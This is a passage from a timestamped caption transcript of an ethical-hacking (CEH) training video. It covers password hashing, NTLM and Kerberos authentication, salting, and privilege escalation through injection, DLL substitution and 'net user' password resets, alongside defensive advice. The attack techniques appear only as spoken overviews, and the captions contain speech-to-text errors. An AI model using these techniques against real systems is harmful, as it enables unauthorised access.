00:35:59.670\n>> Mm-hm.\n>> Do have one you can bring\n\n836\n00:35:59.670 --> 00:36:00.250\nup while we're talking?\n\n837\n00:36:00.250 --> 00:36:00.750\n>> I can pull one, yeah.\n\n838\n00:36:00.750 --> 00:36:02.910\n>> So we can just quickly talk\nabout what a hash looks like,\n\n839\n00:36:02.910 --> 00:36:04.610\nand we'll show you what that is.\n\n840\n00:36:04.610 --> 00:36:08.390\nBut the idea is we generate a hash,\nand then we take that hash, and\n\n841\n00:36:08.390 --> 00:36:10.150\nthat string is stored in the database.\n\n842\n00:36:10.150 --> 00:36:12.420\nThat's essentially going\nto represent the user.\n\n843\n00:36:12.420 --> 00:36:15.180\nAnd then we can validate\nthat by doing comparison.\n\n844\n00:36:15.180 --> 00:36:17.490\nWhen Joe shows up and say hey, I'm Joe.\n\n845\n00:36:17.490 --> 00:36:18.990\nHere's my hash.\n\n846\n00:36:18.990 --> 00:36:19.870\nWe can compare that.\n\n847\n00:36:19.870 --> 00:36:22.620\nSo if you choose,\nI can't see what the list is there,\n\n848\n00:36:22.620 --> 00:36:25.180\nI just see you're selecting,\nbut, there we go, look at that.\n\n849\n00:36:25.180 --> 00:36:28.790\nSo yeah, choose something like md5,\nit's 128 bit output,\n\n850\n00:36:28.790 --> 00:36:30.540\nit's pretty straightforward.\n\n851\n00:36:30.540 --> 00:36:36.430\nSo if you go ahead and hash, the dog\nis blue, or whatever you're gonna put.\n\n852\n00:36:36.430 --> 00:36:37.710\nYou decide, you're driving,\n\n853\n00:36:37.710 --> 00:36:41.830\nI'm being a front-seat driver as\nopposed to a passive participant here.\n\n854\n00:36:41.830 --> 00:36:43.350\nSo we'll let Mike run the demo.\n\n855\n00:36:43.350 --> 00:36:46.910\nSo he's gonna do the hash for us and\nshow us that if he does the dog is blue.\n\n856\n00:36:46.910 --> 00:36:48.170\nI guess the output's down below?\n\n857\n00:36:48.170 --> 00:36:49.340\nWe got that string right there.\n\n858\n00:36:49.340 --> 00:36:51.840\nSo what would happen\nessentially in MTLM or\n\n859\n00:36:51.840 --> 00:36:54.640\nLM is, we would just choose\nthe appropriate algorithm.\n\n860\n00:36:54.640 --> 00:36:57.410\nWe would choose the appropriate\nhash algorithm.\n\n861\n00:36:57.410 --> 00:37:02.500\nThen the SAM database and\nthe SAM security process,\n\n862\n00:37:02.500 --> 00:37:05.750\nthis is essentially where\nthe Windows Hive, the Windows Security\n\n863\n00:37:05.750 --> 00:37:10.605\nprocess in the Windows system is gonna\nrun that hash, produce that output.\n\n864\n00:37:10.605 --> 00:37:12.030\n>> Mm-hm.\n>> And then store it and say,\n\n865\n00:37:12.030 --> 00:37:13.620\nokay this is equals that.\n\n866\n00:37:13.620 --> 00:37:16.060\nAnd then when we come along a week or\na month or\n\n867\n00:37:16.060 --> 00:37:17.860\na year later we wanna authenticate.\n\n868\n00:37:17.860 --> 00:37:21.760\nWe send that across the wire at\nthe Ctrl+Alt+Delete logon prompt.\n\n869\n00:37:21.760 --> 00:37:22.950\nAnd we provide that string.\n\n870\n00:37:22.950 --> 00:37:24.150\nAnd then that string is compared.\n\n871\n00:37:24.150 --> 00:37:25.950\nAnd we see whether or not we have a match.\n\n872\n00:37:25.950 --> 00:37:28.960\nAnd if we have a match, then the domain\ncontroller authenticates us and\n\n873\n00:37:28.960 --> 00:37:29.770\nlets us in.\n\n874\n00:37:29.770 --> 00:37:32.100\nIf we don't, then essentially we do not.\n\n875\n00:37:32.100 --> 00:37:36.550\nAnd it's easy to figure that out, because\nit's easy to see what the match would be.\n\n876\n00:37:36.550 --> 00:37:39.740\nAnd if we change any of those values,\nno matter what they are.\n\n877\n00:37:39.740 --> 00:37:42.270\nAnd it doesn't need to be,\nthe dog is blue, and we change it,\n\n878\n00:37:42.270 --> 00:37:44.040\nyou just added a period or something?\n\n879\n00:37:44.040 --> 00:37:44.790\n>> I just put a period in there.\n\n880\n00:37:44.790 --> 00:37:47.390\n>> We just add that, or\nwe could just spell blue a different way,\n\n881\n00:37:47.390 --> 00:37:50.870\nor we can even just change one\nof the letters to be capital.\n\n882\n00:37:50.870 --> 00:37:52.840\nAnd all those things\nwould change the output.\n\n883\n00:37:52.840 --> 00:37:53.830\n>> Completely changed it.\n\n884\n00:37:53.830 --> 00:37:56.160\n>> And we'll take your word for\nit it's completely changed right.\n\n885\n00:37:56.160 --> 00:38:00.870\n>> If we change this-\n>> And make it something like that.\n\n886\n00:38:00.870 --> 00:38:02.800\nStarts off with the seven on\nthat one now to a nine, seven.\n\n887\n00:38:02.800 --> 00:38:03.900\nOr something like that, right.\n\n888\n00:38:03.900 --> 00:38:06.190\nSo we can see that that changes as well.\n\n889\n00:38:06.190 --> 00:38:10.680\nSo it's easy to understand that\na variance in the password of any kind\n\n890\n00:38:10.680 --> 00:38:12.390\nwould represent a difference in the hash.\n\n891\n00:38:12.390 --> 00:38:14.570\nAnd as a result the digest\nwould be different, and\n\n892\n00:38:14.570 --> 00:38:15.700\nwe would then be able to do.\n\n893\n00:38:15.700 --> 00:38:18.650\nA quick yes, no and\nallow you in or not based on that.\n\n894\n00:38:18.650 --> 00:38:20.310\nWhen we think about\nKerberos authentication,\n\n895\n00:38:20.310 --> 00:38:21.630\na little bit different right, and\n\n896\n00:38:21.630 --> 00:38:24.180\nwe're thinking about using the KDC,\nthe key distribution center,\n\n897\n00:38:24.180 --> 00:38:27.990\nwhich in Windows is just your\ndomain control essentially, right.\n\n898\n00:38:27.990 --> 00:38:30.350\nAnd we're gonna be at the domain\ncontroller on the KDC,\n\n899\n00:38:30.350 --> 00:38:34.130\nwe actually have two distinct roles We\nhave what's known as the authentication\n\n900\n00:38:34.130 --> 00:38:38.770\nserver, commonly called the AS in\nKerberos documentation, and the TGS.\n\n901\n00:38:38.770 --> 00:38:40.740\nThe ticket granting server role.\n\n902\n00:38:40.740 --> 00:38:45.510\nThese are just simply roles that\nare executed the Kerberos service.\n\n903\n00:38:45.510 --> 00:38:48.790\nBut what the TGS does is\nit gives out tickets.\n\n904\n00:38:48.790 --> 00:38:52.790\nWhat the AS does is it authenticates\nrequests against the LDAP directory.\n\n905\n00:38:52.790 --> 00:38:56.100\nSince this is probably all\nhappening on the domain controller.\n\n906\n00:38:56.100 --> 00:38:59.040\nWe look at, more often than not,\nthe domain controller and\n\n907\n00:38:59.040 --> 00:39:02.770\nsay, that's the KBC, and\nit's performing the Kerberos function,\n\n908\n00:39:02.770 --> 00:39:05.820\nmeaning that these services or\nthese roles are running inside.\n\n909\n00:39:05.820 --> 00:39:09.290\nAnd the dialogue and the exchange is just\nall happening internally, essentially.\n\n910\n00:39:09.290 --> 00:39:10.710\nAnd that's what's going on.\n\n911\n00:39:10.710 --> 00:39:15.230\nBut we are gonna be able to, as a user,\nauthenticate against the domain controller\n\n912\n00:39:15.230 --> 00:39:20.800\nslash KBC, present our credential,\nour hash, right, to show who we are.\n\n913\n00:39:20.800 --> 00:39:25.240\nAnd, or our request for a ticket when we\nare already authenticated to come in and\n\n914\n00:39:25.240 --> 00:39:29.220\nsay hey I'd like to add this service to my\nlist of acceptable things I can use cuz we\n\n915\n00:39:29.220 --> 00:39:30.890\ncan do this different ways.\n\n916\n00:39:30.890 --> 00:39:34.610\nWe can essentially provide a credential,\nask for authentication or\n\n917\n00:39:34.610 --> 00:39:38.430\nalready authenticate it, provide our\nticket that says give access and\n\n918\n00:39:38.430 --> 00:39:42.090\nthen tack on something as\na single use session ticket.\n\n919\n00:39:42.090 --> 00:39:44.520\nTo be able to go and\nreceive name resolution or\n\n920\n00:39:44.520 --> 00:39:48.280\nopen up a connection to a web server,\nor send email, or whatever it is.\n\n921\n00:39:48.280 --> 00:39:49.920\nWe can get tickets for all sorts of stuff.\n\n922\n00:39:49.920 --> 00:39:53.320\nSo Kerberos is going to be issuing all of\nthese tickets to use based on the same\n\n923\n00:39:53.320 --> 00:39:57.750\ngeneral thought process, but We have\nan authentication server role, an AS role.\n\n924\n00:39:57.750 --> 00:39:59.602\nWe have a ticket granting server role.\n\n925\n00:39:59.602 --> 00:40:01.489\nThese are just simply,\nmore often than not,\n\n926\n00:40:01.489 --> 00:40:04.768\nroles that are running inside the domain\ncontroller as additional services or\n\n927\n00:40:04.768 --> 00:40:06.424\nfeatures that are gonna be available.\n\n928\n00:40:06.424 --> 00:40:10.446\nWe've also talked about password salting\nand the value of adding that salt in,\n\n929\n00:40:10.446 --> 00:40:11.056\nremember.\n\n930\n00:40:11.056 --> 00:40:13.806\nThe salt is really just\na random string of nonsense,\n\n931\n00:40:13.806 --> 00:40:16.410\njust seemingly random garbage which it is.\n\n932\n00:40:16.410 --> 00:40:19.920\nWe add that to the hashes to make\nit harder to reverse engineer it,\n\n933\n00:40:19.920 --> 00:40:24.356\nbecause to get the match, you have to have\nto actual password string plus the salt.\n\n934\n00:40:24.356 --> 00:40:25.550\nThe random naughts or IV,\n\n935\n00:40:25.550 --> 00:40:28.986\nit's called different things depending\non what we're doing at the time.\n\n936\n00:40:28.986 --> 00:40:32.180\nBut essentially the randomness\nthat's generated and\n\n937\n00:40:32.180 --> 00:40:34.966\ninserted becomes a key differentiator for\nus.\n\n938\n00:40:34.966 --> 00:40:39.167\nBecause that way, if you're gonna reverse\nengineer the hash using a rainbow table,\n\n939\n00:40:39.167 --> 00:40:42.700\nyou gotta have the salt plus\nthe actual password to get the match.\n\n940\n00:40:42.700 --> 00:40:46.870\nAnd it makes it a lot harder for us,\nas a result of that to be able to do that.\n\n941\n00:40:46.870 --> 00:40:50.910\nNow keep in mind, Windows password\nhashes are not salted by default, and\n\n942\n00:40:50.910 --> 00:40:53.190\nthat's something to consider and\nto think about.\n\n943\n00:40:53.190 --> 00:40:56.320\nShame on us for not being more secure but\nthat is the case right.\n\n944\n00:40:56.320 --> 00:40:57.890\nSo just something to consider,\n\n945\n00:40:57.890 --> 00:41:01.470\nwe can add salting to them of course but\nby default they are not.\n\n946\n00:41:01.470 --> 00:41:05.160\nSo that's just something we would\nwant to at least be aware of and\n\n947\n00:41:05.160 --> 00:41:08.750\nmake sure that in our mind,\nas a ethical hacker, we are aware of,\n\n948\n00:41:08.750 --> 00:41:10.620\ncuz we would then have to\ntake that into account.\n\n949\n00:41:10.620 --> 00:41:12.870\nWhat are some ways we could\ndefend against password cracking?\n\n950\n00:41:12.870 --> 00:41:16.470\nWe talked about the fact that using\nthings like salting would be valuable,\n\n951\n00:41:16.470 --> 00:41:18.010\nbecause it adds complexity.\n\n952\n00:41:18.010 --> 00:41:21.620\nEncrypting transmission so\npeople cannot find the hashes and\n\n953\n00:41:21.620 --> 00:41:24.820\npull them out through passive sniffing\nwould be important to consider.\n\n954\n00:41:24.820 --> 00:41:27.290\nDon't share passwords,\ndon't reuse passwords,\n\n955\n00:41:27.290 --> 00:41:31.380\ndon't use the same password,\ndon't use simple passwords.\n\n956\n00:41:31.380 --> 00:41:34.580\nAll the things we know already\nthat are supposed to be there.\n\n957\n00:41:34.580 --> 00:41:38.520\nDon't use clear text, protocols that\nsend without encryption on the wire.\n\n958\n00:41:38.520 --> 00:41:40.900\nMake sure we change\npasswords fairly frequently.\n\n959\n00:41:40.900 --> 00:41:43.800\nAll common sense stuff we've already\ntalked about would be valuable here.\n\n960\n00:41:43.800 --> 00:41:46.210\nDon't allow default passwords\nto stay in place, right?\n\n961\n00:41:46.210 --> 00:41:49.300\nObviously very important not to do that.\n\n962\n00:41:49.300 --> 00:41:53.843\nDon't let users use common things\nlike date of birth, kids' names,\n\n963\n00:41:53.843 --> 00:41:55.541\ndogs, cats, whatever.\n\n964\n00:41:55.541 --> 00:41:58.446\nThere's a million to one things\nyou can find, and again,\n\n965\n00:41:58.446 --> 00:42:02.180\nsocially engineering tends to give\nyou a lot of this information.\n\n966\n00:42:02.180 --> 00:42:05.030\nStart talking to somebody,\nyou find out certain things about them.\n\n967\n00:42:05.030 --> 00:42:06.110\nYou go back and try that stuff,\n\n968\n00:42:06.110 --> 00:42:08.380\na lot of times some of that\nstuff may be their password.\n\n969\n00:42:08.380 --> 00:42:11.070\nSo it's also important to think about and\nto consider, right.\n\n970\n00:42:11.070 --> 00:42:14.410\nWe spent a lot of time just talking\nabout cracking passwords and\n\n971\n00:42:14.410 --> 00:42:19.010\nhow to do that in this particular topic\nand overall talking about system hacking.\n\n972\n00:42:19.010 --> 00:42:20.770\nThere's a lot to system hacking.\n\n973\n00:42:20.770 --> 00:42:23.520\nWe're gonna have upcoming episodes where\nwe're gonna have to delve deeper Into some\n\n974\n00:42:23.520 --> 00:42:25.650\nof the other things that we mentioned,\nwe're going to get into.\n\n975\n00:42:25.650 --> 00:42:29.440\nThings like escalation of privilege,\nexecuting applications, hiding files,\n\n976\n00:42:29.440 --> 00:42:30.410\nto stenography.\n\n977\n00:42:30.410 --> 00:42:33.080\nSo, a lot more to come in this area,\nin this conversation.\n\n978\n00:42:33.080 --> 00:42:35.186\nSo come on back, as they say.\n\n979\n00:42:35.186 --> 00:42:38.460\n>> [LAUGH] All right, Adam,\nwe appreciate that, great look or\n\n980\n00:42:38.460 --> 00:42:42.640\nbeginning to look at system hackings,\nsome of the steps that we might be taking\n\n981\n00:42:42.640 --> 00:42:47.370\nto start gaining access and eventually\nmaintaining access to these systems.\n\n982\n00:42:47.370 --> 00:42:51.064\nAnd we talked about too, using the,\nI almost want to think of it like project\n\n983\n00:42:51.064 --> 00:42:53.970\nmanagement and\nthe deliverables from the previous phase.\n\n984\n00:42:53.970 --> 00:42:57.188\nCuz we take that information we\ngathered for the foot printing,\n\n985\n00:42:57.188 --> 00:43:01.243\nnot the finger printing, and the scanning\nphase and the enumeration phase, and\n\n986\n00:43:01.243 --> 00:43:04.155\nall that is gonna be used when\nwe get to this fourth phase.\n\n987\n00:43:04.155 --> 00:43:08.645\nWe appreciate that look at that Adam, we\nhope everybody out there enjoyed watching.\n\n988\n00:43:08.645 --> 00:43:11.315\nSigning off for ITPRO.TV,\nI'm Mike Rodrick.\n\n989\n00:43:11.315 --> 00:43:12.895\n>> I'm an MCLM hash.\n\n990\n00:43:12.895 --> 00:43:13.985\n>> Okay, we'll see ya next time.\n\n991\n00:43:13.985 --> 00:43:14.795\n>> But I'm not salty.\n\n992\n00:43:14.795 --> 00:43:15.451\n>> No salt.\n\n993\n00:43:17.148 -->

00:00:19.380\nI'm your host Mike Broderick, and\ntoday were doing CEH version 9.\n\n4\n00:00:19.380 --> 00:00:23.700\nSpecifically in this episode were\nactually continuing our thought process\n\n5\n00:00:23.700 --> 00:00:25.300\non system hacking.\n\n6\n00:00:25.300 --> 00:00:28.040\nWe've talked a little bit about,\ntalking about passwords and\n\n7\n00:00:28.040 --> 00:00:29.770\npassword cracking techniques,\n\n8\n00:00:29.770 --> 00:00:34.850\nnow we're gonna move on into escalating\nprivileges and a couple other areas.\n\n9\n00:00:34.850 --> 00:00:37.870\nAnd here to help us with that Is mister\nAdam Gordon, how you doing Adam?\n\n10\n00:00:37.870 --> 00:00:40.820\n>> I'm good, I'm escalating,\nI'm moving up the escalator,\n\n11\n00:00:40.820 --> 00:00:44.400\nI'm so short I can't really go very far,\nbut I'm moving up the escalation chain.\n\n12\n00:00:44.400 --> 00:00:46.910\nIt's all about privilege\nescalation we're gonna talk about\n\n13\n00:00:46.910 --> 00:00:48.800\nas one of the next steps\nin system hacking.\n\n14\n00:00:48.800 --> 00:00:52.450\nWe spent a lot of time in our prior\nepisode talking about password hacking,\n\n15\n00:00:52.450 --> 00:00:54.930\nall the ins and outs and\nintricacies of that.\n\n16\n00:00:54.930 --> 00:00:56.380\nWe're gonna take that\nto the next level now.\n\n17\n00:00:56.380 --> 00:00:59.190\nSo let's say we've gotten that password,\nwe've figured it out,\n\n18\n00:00:59.190 --> 00:01:03.510\nwe've taken that hash, salted or\nunsalted, and we figured out what it is.\n\n19\n00:01:03.510 --> 00:01:04.190\nWhat do we do with it?\n\n20\n00:01:04.190 --> 00:01:07.750\nWell clearly, we go to log in and\ntry to use that to our advantage, right?\n\n21\n00:01:07.750 --> 00:01:09.930\nSo privilege escalation is that art,\n\n22\n00:01:09.930 --> 00:01:13.020\nthat science,\nthat approach that bad actors will use\n\n23\n00:01:13.020 --> 00:01:16.720\nin order to try to take away from us\nthe most important thing that we posses.\n\n24\n00:01:16.720 --> 00:01:18.870\nWhich is our ability to\nrepresent who we are and\n\n25\n00:01:18.870 --> 00:01:23.070\nthen use that privilege, that\ninformation to access system resources.\n\n26\n00:01:23.070 --> 00:01:26.900\nAnd so, when we think about purpose\nescalation we're trying to gain access\n\n27\n00:01:26.900 --> 00:01:31.880\ntake probably a generic nonadministrative\naccount and play that up, so to speak.\n\n28\n00:01:31.880 --> 00:01:34.810\nAnd try to gain additional access\nthrough a series of actions.\n\n29\n00:01:34.810 --> 00:01:40.120\nSo, one example may be,\nwe may engage in some sort of an attack.\n\n30\n00:01:40.120 --> 00:01:43.680\nThat would allow us to gain access to\na low level non privileged account.\n\n31\n00:01:43.680 --> 00:01:47.190\nWe'd start poking around in systems,\nlogging in legitimately, looking for\n\n32\n00:01:47.190 --> 00:01:48.400\nwhat we can gain access to.\n\n33\n00:01:48.400 --> 00:01:51.830\nAnd maybe along the way we\nstart to do some profiling,\n\n34\n00:01:51.830 --> 00:01:54.620\nwe'll go back in time a little bit,\nsome prior steps.\n\n35\n00:01:54.620 --> 00:01:57.960\nWe do some reconing,\nsome foot printing, fingerprinting,\n\n36\n00:01:57.960 --> 00:01:59.150\nfinger painting what are we doing?\n\n37\n00:01:59.150 --> 00:01:59.830\n>> Finger painting.\n\n38\n00:01:59.830 --> 00:02:00.390\n>> Finger painting!\n\n39\n00:02:00.390 --> 00:02:02.730\nWe're going to do some finger painting,\nand we're going to go back and\n\n40\n00:02:02.730 --> 00:02:03.660\ndo some foot printing, right?\n\n41\n00:02:03.660 --> 00:02:04.390\nDo some analysis.\n\n42\n00:02:04.390 --> 00:02:09.370\nDo some numeration and maybe we find\nthat there's a sequel database or\n\n43\n00:02:09.370 --> 00:02:11.140\nan oracle database.\n\n44\n00:02:11.140 --> 00:02:13.570\nTake your pick db2,\nInformix, who knows what.\n\n45\n00:02:13.570 --> 00:02:14.640\nWhatever kind of database.\n\n46\n00:02:14.640 --> 00:02:15.600\nOpen SQL.\n\n47\n00:02:15.600 --> 00:02:16.560\nDoesn't matter.\n\n48\n00:02:16.560 --> 00:02:19.490\nThat is running and\nwe want to see what data is in the tables\n\n49\n00:02:19.490 --> 00:02:21.270\nbecause that's gonna be\nvery important to us.\n\n50\n00:02:21.270 --> 00:02:24.780\nWe may try a SQL injection attack,\nand we may see whether or\n\n51\n00:02:24.780 --> 00:02:27.890\nnot we can send some malformed\ncode against that database.\n\n52\n00:02:27.890 --> 00:02:31.780\nWe'll talk all about this in upcoming\nepisodes, do a whole set of discussions\n\n53\n00:02:31.780 --> 00:02:35.130\non injection attacks and\nhow to use them to compromise systems.\n\n54\n00:02:35.130 --> 00:02:36.620\nSo I'm not gonna go into all of that now,\n\n55\n00:02:36.620 --> 00:02:39.960\nbut just at a high level,\nwe may try to propagate that attack.\n\n56\n00:02:39.960 --> 00:02:44.790\nIf we can do that, leading to a buffer\noverflow in the system, we may be able to\n\n57\n00:02:44.790 --> 00:02:48.720\nuse a privilege escalation as an outcome,\nas a process of that.\n\n58\n00:02:48.720 --> 00:02:52.390\nOr rather as an outcome of that process,\nwe may get privilege escalation, and\n\n59\n00:02:52.390 --> 00:02:55.280\nwe may actually wind up with\nadministrative rights on that database or\n\n60\n00:02:55.280 --> 00:02:56.840\nin that entire system.\n\n61\n00:02:56.840 --> 00:03:00.600\nOr at least in the table and in that\nparticular instance of the database.\n\n62\n00:03:00.600 --> 00:03:03.440\nAnd we may have full admin rights even\nthough we started out as a normal user\n\n63\n00:03:03.440 --> 00:03:06.180\nthrough privilege escalation\npaired with an injection attack.\n\n64\n00:03:06.180 --> 00:03:11.120\nSo escalations can be very problematic if,\nfor whatever reason, we\n\n65\n00:03:11.120 --> 00:03:15.880\nare allowed as an individual user without\nrights to execute system resources.\n\n66\n00:03:15.880 --> 00:03:20.840\nUse them and/or software that may seek\nto compromise those accounts and in some\n\n67\n00:03:20.840 --> 00:03:25.120\nway give us root level or, just in Windows\ntalk, about administrative level access.\n\n68\n00:03:25.120 --> 00:03:27.840\nIf admin accounts are not protected,\nif we don't audit them and\n\n69\n00:03:27.840 --> 00:03:31.520\nmonitor them round the clock,\nif we are not looking a group membership.\n\n70\n00:03:31.520 --> 00:03:35.060\nIf we are not keeping track on these\nthings, we may find it a bad actor can\n\n71\n00:03:35.060 --> 00:03:38.060\ncome and can insert themselves and\nwe saw for instance.\n\n72\n00:03:38.060 --> 00:03:41.720\nThe demo we did in one of the prior\nepisodes where we use the hyena tool\n\n73\n00:03:41.720 --> 00:03:42.780\nto create users.\n\n74\n00:03:42.780 --> 00:03:46.350\nIt may not be that complicated to\ninsert ourselves into a group or\n\n75\n00:03:46.350 --> 00:03:48.850\nto prevent somebody else from\nhaving those rights, and\n\n76\n00:03:48.850 --> 00:03:51.960\ntaking them and\nswapping with them essentially, right?\n\n77\n00:03:51.960 --> 00:03:53.000\nSo we want to think about that.\n\n78\n00:03:53.000 --> 00:03:58.720\nWe may use tools or\napproaches like DLL hijacking\n\n79\n00:03:58.720 --> 00:04:01.660\nto be able to use and\nexecute on privilege escalation.\n\n80\n00:04:01.660 --> 00:04:05.420\nThis can be something we can do\nwhere since we don't typically, or\n\n81\n00:04:05.420 --> 00:04:11.040\nwe don't normally look at digitally signed\nDLL's and validate them all the time.\n\n82\n00:04:11.040 --> 00:04:16.160\nIf we can go ahead and put malicious\nDLL's into an application directory,\n\n83\n00:04:16.160 --> 00:04:18.880\nallowing them to be substituted for\nnormal DLL's.\n\n84\n00:04:18.880 --> 00:04:21.670\nWe may be able to use them to\ngive us rights because they may\n\n85\n00:04:21.670 --> 00:04:23.310\nmodify the way the software works.\n\n86\n00:04:23.310 --> 00:04:26.580\nBy the way, any of you and I'm not saying\nany of you have ever done this and\n\n87\n00:04:26.580 --> 00:04:30.250\nI'm not saying that you should, but\nwe know that people do use cracked or\n\n88\n00:04:30.250 --> 00:04:32.570\nhack software from time to time.\n\n89\n00:04:32.570 --> 00:04:34.690\nObviously not legal, not appropriate,\n\n90\n00:04:34.690 --> 00:04:37.860\nsome of you should not do, but\nlet's be brutally honest for a minute.\n\n91\n00:04:37.860 --> 00:04:39.670\nWe all know that it happens.\n\n92\n00:04:39.670 --> 00:04:42.460\nWe may even use it ourselves\nfrom time to time.\n\n93\n00:04:42.460 --> 00:04:45.570\nWe may even use it to further our\nknowledge about how things work because we\n\n94\n00:04:45.570 --> 00:04:47.870\nmay get a copy of a piece of software.\n\n95\n00:04:47.870 --> 00:04:50.960\nAnd we may wanna play around with it, see\nif we can hack it and do separate things.\n\n96\n00:04:50.960 --> 00:04:53.070\nSo there's reasons why this occurs.\n\n97\n00:04:53.070 --> 00:04:56.510\nBut, if you find hacked software\nrunning on your network or\n\n98\n00:04:56.510 --> 00:05:00.410\nif you have knowledge of hacked software,\nhowever that came to be.\n\n99\n00:05:00.410 --> 00:05:05.080\nThe way you hack software is essentially\nby substituting DLLs for hack DLLs.\n\n100\n00:05:05.080 --> 00:05:08.840\nYou essentially do exactly what I'm\ndescribing to modify the way the system\n\n101\n00:05:08.840 --> 00:05:13.470\nworks, to modify the reg key, or\nthe registration, the license or whatever.\n\n102\n00:05:13.470 --> 00:05:16.460\nYou're hacking that software,\na lot of times you're swapping out DLLs.\n\n103\n00:05:16.460 --> 00:05:20.490\nThe way malware works it swaps out DLLs\na lot of the times in the system, and\n\n104\n00:05:20.490 --> 00:05:23.910\nthen essentially puts in their own\nmodified version to gain control.\n\n105\n00:05:23.910 --> 00:05:26.520\nSo escalation through\nsoftware manipulation is not\n\n106\n00:05:26.520 --> 00:05:27.810\nunheard of by any means.\n\n107\n00:05:27.810 --> 00:05:30.070\nand this is oftentimes what will go on and\n\n108\n00:05:30.070 --> 00:05:33.730\nwhat will happen so we do want to be aware\nof that, we do want to think about that.\n\n109\n00:05:33.730 --> 00:05:36.420\nWe may be able to reset passwords\nusing the command prompt, right?\n\n110\n00:05:37.510 --> 00:05:40.420\nMay be able to go in, and again,\nI'm not saying you can do this,\n\n111\n00:05:40.420 --> 00:05:42.830\nI'm just saying that you\nmay be able to do this.\n\n112\n00:05:42.830 --> 00:05:46.550\nIf, for instance, we use the net\nuser command, right in Windows,\n\n113\n00:05:46.550 --> 00:05:48.380\nwe can use that user set password.\n\n114\n00:05:48.380 --> 00:05:50.440\nOr net user, user account name.\n\n115\n00:05:50.440 --> 00:05:51.510\nAnd then we can go ahead and\n\n116\n00:05:51.510 --> 00:05:54.040\nset a new password by using\nnew password as a command.\n\n117\n00:05:54.040 --> 00:05:56.320\nSo, we may have right to do this.\n\n118\n00:05:56.320 --> 00:05:58.720\nAgain, you would have to have\nadministrator rights potentially to do\n\n119\n00:05:58.720 --> 00:06:02.830\nthis but we maybe able to propagate those\nrights and figure out how to use them.\n\n120\n00:06:02.830 --> 00:06:05.600\nIf that is the case, we may be\nable to get administrative rights.\n\n121\n00:06:05.600 --> 00:06:07.150\nSo, wanna think about that.\n\n122\n00:06:07.150 --> 00:06:09.170\nThere are different tools that\nwill let us do this well.\n\n123\n00:06:09.170 --> 00:06:12.010\nWe are going to go into what all of them\nare, but you'll have a general idea.\n\n124\n00:06:12.010 --> 00:06:13.770\nI'll name a couple of them for you.\n\n125\n00:06:13.770 --> 00:06:19.910\nThere is let me think of some,\nthe years ago,\n\n126\n00:06:19.910 --> 00:06:24.120\nthere was the ERD commander which\nwas system's that kinda killed that.\n\n127\n00:06:24.120 --> 00:06:27.435\nI guess they realized, well, that's\nactually one we don't want people to have.\n\n128\n00:06:27.435 --> 00:06:28.840\n>> [LAUGH]\n>> So that's why I think they went out and\n\n129\n00:06:28.840 --> 00:06:30.930\nactually bought the company and\nthen got rid of that one.\n\n130\n00:06:30.930 --> 00:06:34.333\nWell, there are some out there,\nthere's Phoenix Password Recovery,\n\n131\n00:06:34.333 --> 00:06:37.330\nI think it's\nStellar Phoenix Password Recovery.\n\n132\n00:06:37.330 --> 00:06:41.360\nSo it's probably www.stellarinfo.com\nif I remember correctly.\n\n133\n00:06:41.360 --> 00:06:45.060\nThere's PasswordLastic,\nthere's a bunch out there,\n\n134\n00:06:45.060 --> 00:06:46.310\nI mean there's just millions of them.\n\n135\n00:06:46.310 --> 00:06:48.310\nYou can go out and Google for\nthem and probably find a bunch,\n\n136\n00:06:48.310 --> 00:06:50.910\nbut the idea is that you may find one or\nmore of them.\n\n137\n00:06:50.910 --> 00:06:54.700\nHow do we defend against privilege\nescalation and password manipulation,\n\n138\n00:06:54.700 --> 00:06:56.330\nall these things.\n\n139\n00:06:56.330 --> 00:06:59.760\nRestricting interactive logon privileges\nso making sure people can not log in\n\n140\n00:06:59.760 --> 00:07:03.830\nlocally or interactively to only certain\naccounts would be helpful first of all.\n\n141\n00:07:03.830 --> 00:07:07.100\nObviously, using encryption as we've\ntalked about is usually good panacea,\n\n142\n00:07:07.100 --> 00:07:09.760\na good recommendation and\na good control for almost anything.\n\n143\n00:07:09.760 --> 00:07:12.390\nMaking sure we practice\nthe idea of least privilege,\n\n144\n00:07:12.390 --> 00:07:15.810\nmaking sure we don't give users more\nrights than are necessary to do their job.\n\n145\n00:07:15.810 --> 00:07:17.620\nOne of the biggest issues we have and\n\n146\n00:07:17.620 --> 00:07:21.280\nfind when we go audit a great deal of the\ntime, is that we'll audit user accounts.\n\n147\n00:07:21.280 --> 00:07:22.620\nWe'll look for group membership.\n\n148\n00:07:22.620 --> 00:07:25.180\nWe'll try to figure out what it\nis that people are doing, and\n\n149\n00:07:25.180 --> 00:07:29.490\nwhat we will find is that as we\npull a list and we look at them.\n\n150\n00:07:29.490 --> 00:07:32.570\nWe see that all these accounts have\nrights in all these groups, and\n\n151\n00:07:32.570 --> 00:07:34.930\nthen we ask well what are you\ndoing in these five groups?\n\n152\n00:07:34.930 --> 00:07:36.080\nWhat does this user do?\n\n153\n00:07:36.080 --> 00:07:37.430\nThis is just a normal user.\n\n154\n00:07:37.430 --> 00:07:40.330\nThey're an information worker,\nthey don't do anything special.\n\n155\n00:07:40.330 --> 00:07:42.410\nWell, why are they in all these accounts?\n\n156\n00:07:42.410 --> 00:07:44.660\nWhy are these accounts\ntravelling to all these groups?\n\n157\n00:07:44.660 --> 00:07:46.790\nI don't know.\nWell, that's not what an auditor wants to\n\n158\n00:07:46.790 --> 00:07:47.370\nhear, by the way.\n\n159\n00:07:47.370 --> 00:07:49.070\n>> [LAUGH]\n>> Just in case you were wondering about\n\n160\n00:07:49.070 --> 00:07:50.343\nthat and didn't know for sure,\n\n161\n00:07:50.343 --> 00:07:53.090\non the top ten list of things that\nauditors don't wanna hear on site.\n\n162\n00:07:53.090 --> 00:07:56.414\nI don't know is really almost always\nat the top of that list, right?\n\n163\n00:07:56.414 --> 00:07:59.425\nSo make sure you know what's going on.\n\n164\n00:07:59.425 --> 00:08:01.980\nThis is just good old\nfashioned common sense, right?\n\n165\n00:08:01.980 --> 00:08:06.100\nYou gotta inspect what you expect,\nis what we often say, right?\n\n166\n00:08:06.100 --> 00:08:10.650\nIf you're trusting that stuff's being done\nand you're not validating it, guess what?\n\n167\n00:08:10.650 --> 00:08:15.610\nYou are on the short list for\nhaving a major, major bad Monday, right?\n\n168\n00:08:15.610 --> 00:08:17.850\nWe call those events RGE events,\nby the way.\n\n169\n00:08:17.850 --> 00:08:19.630\nYou know what those are?\n\n170\n00:08:19.630 --> 00:08:22.020\n>> Resume Generate-\n>> Resume Generation Events, right?\n\n171\n00:08:22.020 --> 00:08:23.140\nSo-\n>> We don't want those.\n\n172\n00:08:23.140 --> 